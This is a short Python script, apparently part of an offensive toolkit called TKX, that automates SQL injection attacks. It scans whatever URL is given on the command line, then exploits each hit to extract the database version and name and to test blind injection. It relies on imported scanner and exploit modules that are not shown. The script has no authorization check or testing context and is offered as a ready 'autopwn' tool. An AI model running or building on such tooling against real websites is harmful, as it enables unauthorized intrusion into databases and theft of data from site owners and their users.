#!/usr/bin/env python3
"""
TKX Autopwn - Auto Exploitation Module
"""
import sys
import json
from tkx_scanner import TKXScanner
from tkx_exploit import TKXExploit

def autopwn(target_url: str):
    """Automated scan and exploitation"""
    print("[*] TKX Autopwn Mode Activated")
    print(f"[*] Target: {target_url}")
    
    # Step 1: Scan for vulnerabilities
    scanner = TKXScanner(target_url)
    vulns = scanner.full_scan(crawl=False, max_payloads=10)
    
    if not vulns:
        print("[-] No vulnerabilities found")
        return
    
    print(f"[+] Found {len(vulns)} vulnerabilities")
    
    # Step 2: Exploit each vulnerability
    for i, vuln in enumerate(vulns, 1):
        print(f"\n[*] Exploiting vulnerability #{i}")
        print(f"    URL: {vuln['url']}")
        print(f"    Parameter: {vuln['parameter']}")
        print(f"    Technique: {vuln['technique']}")
        
        exploiter = TKXExploit(vuln['url'], vuln['parameter'])
        
        # Try to extract info
        print("    [*] Extracting database version...")
        version = exploiter.extract_version()
        print(f"    [+] Version: {version}")
        
        print("    [*] Extracting database name...")
        db_name = exploiter.extract_database()
        print(f"    [+] Database: {db_name}")
        
        print("    [*] Testing blind injection...")
        blind = exploiter.test_blind_injection()
        print(f"    [+] Blind injection: {blind}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python tkx_autopwn.py <URL>")
        print("Example: python tkx_autopwn.py http://test.com/page?id=1")
        sys.exit(1)
    
    autopwn(sys.argv[1])
